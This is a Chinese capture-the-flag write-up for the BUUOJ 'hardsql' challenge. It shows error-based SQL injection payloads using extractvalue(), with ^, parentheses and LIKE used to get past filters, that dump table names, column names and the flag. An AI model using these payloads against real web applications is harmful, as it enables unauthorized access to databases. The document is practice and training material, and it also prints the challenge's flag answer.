### buuoj_[极客大挑战 2019]hardsql

这个典型的sql注入，首先测试一下什么闭合

![](https://pic.imgdb.cn/item/611a49465132923bf85b9a0c.jpg)

![](https://pic.imgdb.cn/item/611a49665132923bf85c0b37.jpg)

可以看到，username部分是单引号闭合，password部分是双引号闭合

试一下万能密码

```
1' or '1'='1
```

![](https://pic.imgdb.cn/item/611a49c75132923bf85d670a.jpg)

看来是不行了，既然有报错信息，那试一下报错注入

```
?username=admin&password=1' extractvalue(1,concat(0x7e,(select(database()))))%23
```

发现不行，又试了下发现还是不行，看了大佬的wp，才知道是字符过滤，把and/空格/union/select/=//**/等都过滤了，那把空格换成^，成功

![](https://pic.imgdb.cn/item/611a4b125132923bf862136f.jpg)

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))%23
```

![](https://pic.imgdb.cn/item/611a4bbf5132923bf8649147.jpg)

这里用括号代替空格，like代替=符号，不过这么看的话，select没被过滤啊。。。

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23
```

![](https://pic.imgdb.cn/item/611a4c485132923bf86683f3.jpg)

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23
```

![](https://pic.imgdb.cn/item/611a4c965132923bf8679c70.jpg)

这里flag只有一半，使用right显示另一部分

```
username=1&password=1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23
```

![](https://pic.imgdb.cn/item/611a4d0e5132923bf8695abc.jpg)

合起来

```
flag{753b1496-baca-4b9a-903b-f96a456db374}
```

